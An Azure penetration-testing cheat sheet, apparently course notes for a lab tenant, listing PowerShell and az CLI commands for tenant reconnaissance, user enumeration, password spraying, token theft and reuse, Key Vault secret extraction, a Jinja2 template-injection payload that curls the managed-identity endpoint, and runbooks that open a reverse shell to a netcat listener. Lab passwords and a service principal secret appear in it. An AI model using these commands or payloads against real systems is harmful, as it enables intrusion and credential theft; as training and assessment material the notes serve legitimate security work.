---
title: Azure Pentesting - Cheat sheet
description: 
published: true
date: 2021-09-27T05:47:48.739Z
tags: cheatsheet, security, pentesting, azure, microsoft
editor: markdown
dateCreated: 2021-08-06T21:40:30.700Z
---

# Azure Pentesting Cheat Sheet

## Info about the Tenant/Subscription/Context
- Get the information about the current context (Account, Tenant, Subscription etc.) 
	Get-AzContext 
	
- List all available contexts 
	Get-AzContext -ListAvailable
	 
- Enumerate subscriptions accessible by the current user
	Get-AzSubscription
	
- Get the current session state
	Get-AzureADCurrentSessionInfo
	
- Get details of the current tenant
	Get-AzureADTenantDetail
	
## Discovery and Recon
	
- Do All Recon with AADInternals tool
	Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose

- Get all the information
	Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
	
- Get tenant name, authentication, brand name (usually same as directory name) and domain name
	Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
	
- Get tenant ID
	Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
	
- Get tenant domains
	Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com

- Get user enumeration as an outsider using a text file
	Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider
	
	
- Get if Azure tenant is in use, tenant name and Federation
	https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1
	  Bsp: https://login.microsoftonline.com/getuserrealm.srf?login=something@defcorphq.onmicrosoft.com&xml=1
		Domain= defcorphq.onmicrosoft.com
	
	• Get the Tenant ID
	Varinate 1: 
		cd C:\AzAD\Tools\
		Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
		Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
	
	Variante 2: https://login.microsoftonline.com/[DOMAIN]/.wellknown/openid-configuration 
		Bsp Domain= defcorphq.onmicrosoft.com
		https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration
		{"token_endpoint":"https://login.microsoftonline.com/2d50cb29-5f7b-48a4-87ce-fe75a941adb6/oauth2/token
	
	• Validate Email ID by sending requests to
	https://login.microsoftonline.com/common/GetCredentialType
		C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt
		C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\only_vaid_email_addreses.txt
		
		 C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -e test@defcorphq.onmicrosoft.com
	

- Enumerate with RoadRecon
• Use Roadrecon for Recon/Enumeration
Start Powershell as administrtor!
cd C:\AzAD\Tools\ROADTools
pipenv shell
roadrecon auth -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
roadrecon auth --device-code (when MFA is activated)
roadrecon -t [TenantID] --device-code (when connecting to specific Tenant with MFA)
roadrecon gather --mfa
roadrecon gui
Chrome http://127.0.0.1:5000/


Installation:
pip install roadlib
pip install roadrecon


- Enumerate with ScoutSuite
 https://github.com/nccgroup/ScoutSuite
Install: https://github.com/nccgroup/ScoutSuite/wiki/Setup

Use: scout azure --user-account-browser --tenant TENANTID

Manual_permission_emulator.ps1 von Moritz
Get-AzSubscription
	

## Enumerate used Azure services with Microburst
(Microburst is a useful tool for security assessment of Azure. It uses Az , AzureAD , AzurRM and MSOL tools and additional REST API calls!)
	Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -verbose
	Invoke-EnumerateAzureSubDomains -Base defcorphq -verbose
	   ==> Takes time
	
	
## Get Valid Email ID
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt

	
## Brute-force / Passwordspray with  MSOLSpray
 One of the users that we enumerated from the defcorphq tenant. // Use fireprox for obfuscation
	Cd C:\AzAD\Tools\MSOLSpray
	Import-Module ./MSOLSpray.ps1
	Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose


## Login & Connect to Tenant:
	Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
	Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
	$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
	Connect-AzureAD -Credential $creds
	Connect-AzAccount -Credential $creds
	
	
- Connect to AzureAD with Token
	From Azure account get AAD Graph Token: az account get-access-token --resource-type aad-graph
	Get-AzContext
	Get-AzADUser -Mail 
	Get-AzADUser -Displayname
	(Get-AzContext).Account
	Connect-AzureAD -TenantID 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 -AccountID 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -AadAccessToken eyJ0eX…
	

	• Connect to Azure with Token 
	Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ…
	az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
	
		• Login as Service principal
	$password = ConvertTo-SecureString '_1ATfh--GD.WBhRuP.H3p_iR~MX2W1OA6S' -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential('[app-id]', $password)
	Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6

• If the user has no permissions on the subscription
	az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234 --allow-no-subscriptions
		
Start Remote PS Powershell session

• Connect to the VM remotely via Powershell 
$password = ConvertTo-SecureString 'Stud6Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student6', $Password)
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess

	
Using Tokens with API

	• Get current Azure Access Token
	Get-AzAccessToken
	
	• Get a token for aad-graph:
	Get-AzAccessToken -ResourceTypeName AadGraph
	az account get-access-token --resource-type aad-graph
		
	• Get access token for ARM
	az account get-access-token
	
	• Get access token for MS-Graph/Graph API
	(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token
	az account get-access-token --resource-type ms-graph
		
	• Get Azure Access Token ----?
	Get-AzAccessToken -ResourceTypeName AadGraph  | Select-Object "Token"
	Get-AzAccessToken -ResourceTypeName AadGraph  | Select-Object "Token" | Set-Clipboard

	Request an access token for Graph API:
	(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com/).Token
	
	Request an access token for AAD Graph to access Azure AD
	Get-AzAccessToken -ResourceTypeName AadGraph
	
	Request token for Microsoft Graph
	(Get-AzAccessToken -Resource https://graph.microsoft.com/).Token

	
	https://graph.windows.net/ Azure AD Graph - deprecated 
	

	Using Tokens with ARM API 
	Get an access token and use it with ARM API. For example, list all the subscriptions
		$Token = 'eyJ0eXAi..'
		$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
		$RequestParams = @{
			Method = 'GET'
			Uri = $URI
			Headers = @{
			'Authorization' = "Bearer $Token"
			}
		}
		(Invoke-RestMethod @RequestParams).value
	
	Using Tokens with Microsoft Graph API
		Get an access token for MS Graph. For example, list all the users
		$Token = 'eyJ0eXAi..'
		$URI = 'https://graph.microsoft.com/v1.0/users'
		$RequestParams = @{
			Method = 'GET'
			Uri = $URI
			Headers = @{
			'Authorization' = "Bearer $Token"
			}
		}
		(Invoke-RestMethod @RequestParams).value



## Users

	• Get all Users
	Get-AzureADUser -All $true
	
	• Enumerate a specific User
	Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com
	Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | fl *
	Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | %{$_.PSObject.Properties.Name} 

	• Enumerate the Membership (Groups) the User is Member
	Get-AzureADUserMembership -Objectid VMContributor6@defcorphq.onmicrosoft.com

	• Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
		Get-AzureADUser -SearchString "admin"
		
	• Search for users who contain the word "admin" in their Display name:
	Get-AzureADUser -All $true |?{$_.Displayname -match "admin"}
		
	• Search attributes for all users that contain the string "password":
	Get-AzureADUser |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
		
	• Get all users who are synced from on-prem
	Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
	
	• Get all users who are from AzureAD
	Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
	
	• Get all Global Get-AzureADAdministrativeUnitstrators
	Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
	
	• Get all users but only PrincipalName = Email
	Get-AzureADUser -All $true | select UserPrincipalName
	
	• Add User to Group (In the below command –ObjectiD is for the Group and –RefObjectId is of Mark.)
	Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-
	84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
	
	• Reset Password of a User
	(1) On Portal (can not choose new password ) or (2) Connect to AzAD with a User with the right permission (choose password)
	$password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText -Force
	(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributor6@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password -Verbose
	
	• Edit the secondary email for the studentx (Danymic Group attack)
	  -ObjectId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com -Verbose

	• Check for elevated Global Administrator access (to all subscriptions & resources) and the User Access Administrator role (an Azure role)
	Get-AzRoleAssignment | where {$_.RoleDefinitionName -eq "User Access Administrator" -and $_.Scope -eq "/"}
	az role assignment list --role "User Access Administrator" --scope "/"
	
	https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin
	
	

## Groups
	• Get members of a group
	Get-AzADGroupMember -GroupDisplayName 'VM Admins'
	Get-AzureADGroupMember -ObjectID id

	• Get all Groups
	Get-AzADGroup
	Get-AzureADGroup -All $true
	
	• Enumerate a specific group
	Get-AzADGroup -DisplayName 'VM Admins'
	Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e 
	
	• Search for a group based on string in first characters of DisplayName (wildcard not
	supported)
	Get-AzureADGroup -SearchString "admin" | fl *

	• To search for groups which contain the word "admin" in their name:
	Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"}
	
	• Get Groups that allow Dynamic membership (Note the cmdlet name) // IF we can control an attribute for the dynamic membership we can get the group
	Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
	
	• All groups that are synced from on-prem (note that security groups are not synced)
	Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
	
	• All groups that are from Azure AD
	Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
	
	• Get groups and roles where the specified user is a member
	Get-AzureADUser -SearchString 'test' | Get-AzureADUserMembership
	Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com 

	• Add User to Group (In the below command –ObjectiD is for the Group and –RefObjectId is of the user)
	Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
	
	

## Devices
	• Get Devices
	Get-AzureADDevice
	
	• Get all Azure joined and registered devices
	Get-AzureADDevice -All $true | fl *
	
	• Get the device configuration object (note the RegistrationQuota in the output)
	Get-AzureADDeviceConfiguration | fl *
	
	• List Registered owners of all the devices
	Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
	
	• List Registered users of all the devices
	Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
	
	• List devices owned by a user
	Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com
	
	• List devices registered by a user	
	Get-AzureADUserRegisteredDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com
	 
	• List devices managed using Intune
	Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
	
	
## Roles

	• (General) Get all available role templates
	Get-AzureADDirectoryroleTemplate
	
	• (General) Get all roles
	Get-AzureADDirectoryRole
	
	• Enumerate all Azure RBAC role assignments
	Get-AzRoleAssignment
	
	• Get all the role assignments for the user (for other user not possible with defautl role)
Get-AzRoleAssignment -SignInName <email_or_userprincipalname>

	• Get the Role of the current logged in User on a specific Ressource
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d4049-8c11-
	d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automa
	tionAccounts/HybridAutomation
	
	• Enumerate users to whom roles are assigned like Global Administrator
	Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
	
	• Get all custom created roles
		○ Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
		○ $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
		○ $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
		○ Connect-AzureAD -Credential $creds
		○ Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
	
	(Falls nicht möglich - aktuelle von AzureAD preview Powershell installieren
	Install-Module -Name AzureADPreview -RequiredVersion 2.0.2.129
https://www.powershellgallery.com/packages/AzureADPreview/2.0.2.129)
	
	
## Resources
	• Get all Ressource assigned to the user
	Get-AzResource

	• Get Azure VM
	Get-AzVM | fl *
	az vm list    //You get more Info with that like admin-username,
	az vm list --query "[].[name]" -o table   //only list the name of the VMs
	
	
	• Enum the Az Resource Groups
	Get-AzResourceGroup
	Get-AzResourceGroupDeployment -ResourceGroupName [ResourceNamefromCommandBefore]

	
## Apps / Application (App Services & Function App & Enterprise Applicatoin)

	• List all App Services and Function Apps
	Get-AzWebApp
	• 
	• List all App Services / Parameter "Kind" used
	Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
	az webapp list
	az webapp list --query "[].[name]" -o table  //only list the name of the app service
	
	• List all Function App
	Get-AzFunctionApp
	Get-AzWebApp | ?{$_.Kind -match "functionapp"}
	az functionapp list
	az functionapp list --query "[].[name]" -o table  //only list the name of the function app

	• Get all the application objects / enterprise application registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app.
	Get-AzureADApplication -All $true
	
	• Get all Enterprise Applications / Service principals
	Get-AzureADServicePrincipal

	• Get all details about an application / enterprise application
	Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | fl *
	
	• Get an application based on the display name
	Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"}
	
	The Get-AzureADApplicationPasswordCredential will show the applications
	with an application password but password value is not shown.
	
	• Get owner of an application
	Get-AzureADApplication -ObjectId a1333e88-1278-41bf8145-155a069ebed0 | Get-AzureADApplicationOwner |fl *

	• Get Apps where a User has a role (exact role is not shown)
	Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
	
	• Get Apps where a Group has a role (exact role is not shown)
	Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e | Get-AzureADGroupAppRoleAssignment | fl *
	
	Attack! Add a secret (application password) to the enterprise application / then login as service principal
	. C:\AzAD\Tools\Add-AzADAppSecret.ps1
	az account get-access-token --resource-type ms-graph
	Add-AzADAppSecret -GraphToken $ms-graphtoken -Verbose
	
	
	
## Service Principals
	• Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is thes ecurity object that has privileges. This is the 'service account'! Service Principals can be assigned Azure role
	
	• Get all service principals
	Get-AzureADServicePrincipal -All $true

	• Get all details about a service principal
	Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *
	
	• Get an service principal based on the display name
	Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
	
	• Get owner of a service principal
	Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwner |fl *

	• Get objects owned by a service principal
	Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwnedObject

	• Get objects created by a service principal
	Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalCreatedObject
	
		○ Get group and role memberships of a service principal
	Get-AzureADServicePrincipal -ObjectId cdddd16e-2611- 4442-8f45-053e7c37a264 | GetAzureADServicePrincipalMembership |fl *
	Get-AzureADServicePrincipal | GetAzureADServicePrincipalMembership
	
	• Login as Service principal
	$password = ConvertTo-SecureString '_1ATfh--GD.WBhRuP.H3p_iR~MX2W1OA6S' -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential('[app-id]', $password)
	Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
	

	

## Storage LO13
	• List Storage Accounts
	Get-AzStorageAccount | fl
	
	az storage account list
	
	• Check if there is a container that the user has access to
	Get-AzStorageAccount or - Get-AzResource   (take Name and ResourceGroupName from all ResourceType: Micrososft.Storage/storageAccounts)
	Get-AzStorageContainer -Context (Get-AzStorageAccount -Name [Name] -ResourceGroupName [GroupName]).Context
	
	
	• Enumerate Azure Storage / Blobs mit Microburst
	• Add common, backup, code etc. to permutations.txt in C:\AzAD\Tools\Microburst\Misc
	PS C:\AzAD\Tools> . C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
	PS C:\AzAD\Tools> Invoke-EnumerateAzureBlobs -Base defcorp
	=> Open URLs in Browser????
	=> Take the <name></name> and add to URL e.g.:
		<EnumerationResults ServiceEndpoint="https://defcorpcommon.blob.core.windows.net/" ContainerName="backup">
		<Blobs>
		<Blob>
		<Name>blob_client.py</Name>
		 =>https://defcorpcommon.blob.core.windows.net/backup/blob_client.py
		 => Get SAS URL after "# URL"
		 => Or get account_key
		=> Start Azure Storage Explorer, Select Blob, SAS
		
	• 
	
## Keyvault LO16
	• List Keyvault for current user
	Get-AzKeyVault
	Get-AzKeyVaultSecret -VaultName credvault-fileapp
	az keyvault list
	
	
	• Read cleartext Keyvault secret
	1.Get-AzKeyVault 
	2. Get-AzKeyVaultSecret -VaultName credvault-fileapp
	3. Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name [Name-from-above-cmd] -AsPlainText
		If it doesnt work: Get KeyVault Access Token via eg. WebVuln  // see below how to connect then
			{% for x in ().__class__.__mro__[1].__subclasses__() %}
			 {% if "Popen" in x.__name__ %}Get-Az
			 {{x('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-
			1).communicate()}}
			 {% endif %}
			{% endfor %}
			

	
	• Connect with ARM and KeyVault Access Token from managed identity / Web App see LO16 
	$token = 'eyJ0..'
	$keyvaulttoken = 'eyJ0..'
	Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
	Get-AzKeyVaultSecret -VaultName credvault-fileapp
	Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name [Name-from-above-cmd] -AsPlainText

## Owners
	• Objects created by any user (use -ObjectId for a specific user)
	Get-AzureADUser | Get-AzureADUserCreatedObject
	
	• Objects owned by a specific user
	Get-AzureADUserOwnedObject -ObjectId test@defcorphq.onmicrosoft.com
	
	• Objects owned by currently signed in User
		az ad signed-in-user list-owned-objects
	
	• Get all Device Owner of VM/Devices
		All Device Owners are automatically added to the local Admin Group in VM
		• Get-AzureADDevice | Get-AzureADDeviceRegisteredOwner
		
	• Get owner of an application
	Get-AzureADApplication -ObjectId a1333e88-1278-41bf8145-155a069ebed0 | Get-AzureADApplicationOwner |fl *
	

• Display Conditional Access Policy ( you need "admin" rights https://docs.microsoft.com/en-us/powershell/module/azuread/get-azureadmsconditionalaccesspolicy?view=azureadps-2.0)
	• Get-AzureADMSConditionalAccessPolicy | select Objectid, Displayname, State
	• RoadTools has a plugin to parse the conditional access policy and export the same as caps.html file

## Devices / VM
	• Get all Device Owner of VM/Devices
	All Device Owners are automatically added to the local Admin Group in VM
	Get-AzureADDevice | Get-AzureADDeviceRegisteredOwner

	• Get Azure VM
	• Get-AzVM
	Get-AzVM | fl *
	
	• Get Network Information of a VM
	 Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
		Get-AzNetworkInterface -Name [Name from last command NetworkInterfaces/name]
		
	• Get Public IP Address of a VM (first Netowork information, see above)
Get-AzPublicIpAddress -Name [Id - from above)

	• Check if User is logged-in Azure on the VM
	az ad signed-in-user show
   e
	• Enumerate role assignments on the VM
	Get-AzResource
	Get-AzRoleAssignment -Scope /subscriptions/[ID]/resourceGroups/RESEARCH/providers/Microsoft.Compute/
	virtualMachines/jumpvpm

	• Run a script on the VM / Add a user to the VM
	Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
	
	• Connect to the VM remotely via Powershell 
	$password = ConvertTo-SecureString 'Stud6Password@123' -AsPlainText -Force
	$creds = New-Object System.Management.Automation.PSCredential('student6', $Password)
	$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
	Enter-PSSession $sess
	
	• Get local Users of VM, as soon as PSSession is active
	Get-LocalUser
	
	• Read Powershell History
	 cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	 (Get-PSReadlineOption).HistorySavePath
	
	• Stealing access token on vm
	az cli stores access tokens in clear text in accessTokens.json in the directory C:\Users \[username\.Azure\accessTokens.json
	Azure AD stores …..

## AAD Service Principals
Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'!
• Service Principals can be assigned Azure roles.
	• Get all service principals
	Get-AzADServicePrincipal
	
	• Get all details about a service principal
	Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264
	
	• Get an service principal based on the display name
	Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}


## Hybrid  Worker Group / Automation Account / Runbook - LO14

	• az extension add --upgrade -n automation
	
	• Get automation account information
	Get-AzAutomationAccount

	• Automation Account / Runbook in the portal
	Portal searhch for automation account / Runbooks / Select / Edit
	 Within runbook: Everything under share resources can be used within a runbook
	 
	Edit runbook to add another local user
	
	Access key vaults, connections etc. within the runbook
	
	Run commands on VMs?
	

	• Get Information about automation accounts
	az extension add --upgrade -n automation
	az automation account list
			If nothing is displayed:
			az ad signed-in-user list-owned-objects
			  => Owner einer Azure AD Group 
			az account get-access-token --resource-type aad-graph
			Connect to azure AD with token
			Add the user to the automation admin group: Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
			
			az automation account list => Funktioniert nun
		Get-AzRoleAssignment
		
	• Get the role of the current logged in User for the automation account:
	Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automa tionAccounts/HybridAutomation

	az ad signed-in-user list-owned-objects
	
	
	• Check if a hybrid worker group is in use by the automation account
	az automation account list  => take "name" as "automationaccountname" and "Resource group" as "ResourceGroupName"
	Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
	
	
	• Check if HybridWorkerGroup is in use by the automation account (for Cloud-on-Prem movement)
	Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
	Create a runbook & excute it! Portal or powershell
		Powershell: 
		Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
		Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
		 C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
		Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
		Connect on your Ncfor all resources where runbook is run! 
	

	Attack Automation Account
	• 1. Import/Add a new Runbook
	Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
	
	• 2. Publish the Runbook so it can be used
	Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
	• 
	• 3. Start the Runbook
	Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
	
	https://docs.microsoft.com/en-us/azure/automation/manage-runas-account?WT.mc_id=Portal-Microsoft_Azure_Automation#permissions
	https://docs.microsoft.com/en-us/azure/automation/automation-security-overview
	
## Key Vault
	• You need to connect with KeyVaultAccessToken!
	  Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
		Account ID Is user account / Service account of the app
	• Check if we can access the keyvault and possible any secrets, keys or credentials
	Get-AzKeyVault
		=> Vault Name nehmen [Vaultname]
	Get-AzKeyVaultSecret -VaultName [Vaultname]
		=> Name
	Get-AzKeyVaultSecret -VaultName [Vaultname] -Name [Name] –AsPlainText

## Tokens & Connect
	• Both Az PowerShell and AzureAD modules allow the use of Access tokens for authentication.
	• Usually, tokens contain all the claims (including that for MFA and Conditional Access etc.) so they are useful in bypassing such security controls.
	• The two REST APIs endpoints that are most widely used are
		• Azure Resource Manager management.azure.com
		• Microsoft Graph graph.microsoft.com (Azure AD Graph which is
	
	• If you are already connected to a tenant, request an access token for resource manager (ARM)
	Get-AzAccessToken (Get-AzAccessToken).Token
	
	• Request an access token for AAD Graph to access Azure AD.  Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse
	Get-AzAccessToken -ResourceTypeName AadGraph
	
	• Request an access token for Microsoft Graph to use for Azure AD
	• (Get-AzAccessToken -Resource "https://graph.microsoft.com").Token
	az account get-access-token --resource-type aad-graph
	az account get-access-token --resource https://graph.microsoft.com
	
	• Connect to AzureAD with Token
	From Azure account get AAD Graph Token: az account get-access-token --resource-type aad-graph
	Connect-AzureAD -TenantID 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 -AccountID 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -AadAccessToken eyJ0eX…
	Connect-AzureAD -TenantID 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 -AccountID kathynschaefer@defcorphq.onmicrosoft.com -AadAccessToken eyJ0eXAiOi

	• Connect to Azure with Token 
	Connect-AzAccount -AccountId [email - or - ID] -AccessToken eyJ…
	
	• Use other access tokens. In the below command, use the one for AAD Graph (access token is still required) for accessing Azure AD
	Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA… -GraphAccessToken eyJ0eXA... 
	
	•  Connect to Az with KeyVault
	$token = '….'  // ARM token  from e.g. resource=https://management.azure.com&api-version=2017-09-01
	$keyvaulttoken = '..'  // from eg. https://vault.azure.net&api-version=2017-09-01
	Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
	
	• Connect Graph API
	(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
	
	$Token = 'eyJ0..'
	$URI =
	'https://graph.microsoft.com/v1.0/users/VMContributorX@defcorphq.onmicrosoft.com/memberOf'
	$RequestParams = @{
	 Method = 'GET'
	 Uri = $URI
	 Headers = @{
	 'Authorization' = "Bearer $Token"
	 }
	}
	(Invoke-RestMethod @RequestParams).value
	
	
	• Disconnect from AzAccount
	 Disconnect-AzAccount
	
	• Disconnect from Azure AD Account
	Disconnect-AzureAD
	
	• Stealing access token on vm / To clear the access tokens, always use az logout
	az cli stores access tokens in clear text in accessTokens.json in the directory C:\Users \[username\.Azure\accessTokens.json
	Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory C:\Users \[username\.Azure\TokenCache.dat
	It also stores ServicePrincipalSecret in clear text in AzureRmContext.json if a service principal secret is used to authenticate.  C:\Users \[username\.Azure\AzureRmContext.json
	
	• Search for "Save AzContext" in PowerShell console history
	get-history | select-string -pattern "save"


## Azure Resource Manager (ARM) Templates
	• The 'infrastructure as code' service for Azure to deploy resources using code. ARM templates are JSON files containing deployment configuration for Azure resources. ARM templates also support a language called Bicep (in preview)
	• Attack - LO18 
	- Check the deployment history for clear text Credentials
		 - Azure Portal: Go to Resource Group / Deployments (under Settings) / Template
	- Check the deployment template to contain clear text credentials
	A deployment parameter that contains sensitive information like
